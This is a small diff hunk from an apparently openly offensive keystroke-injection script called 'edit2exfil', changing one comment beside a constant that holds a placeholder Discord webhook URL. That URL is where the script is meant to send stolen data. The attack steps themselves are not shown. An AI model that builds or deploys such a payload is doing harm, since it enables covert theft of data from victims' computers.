@@ -6,7 +6,7 @@ REM DESCRIPTION: (See README.md for full description) - edit2exfil builds a hidd
 REM REQUIREMENTS: Place Discord webhook in the #WEBHOOK_URL constant on line 10.
 REM ==========================================================================================
 
-REM Place Discord webhook and user constants:
+REM Place Discord webhook constant:
 DEFINE #WEBHOOK_URL https://discord.com/api/webhooks/PLACE/WEBHOOK/HERE
 
 REM Begin attack:
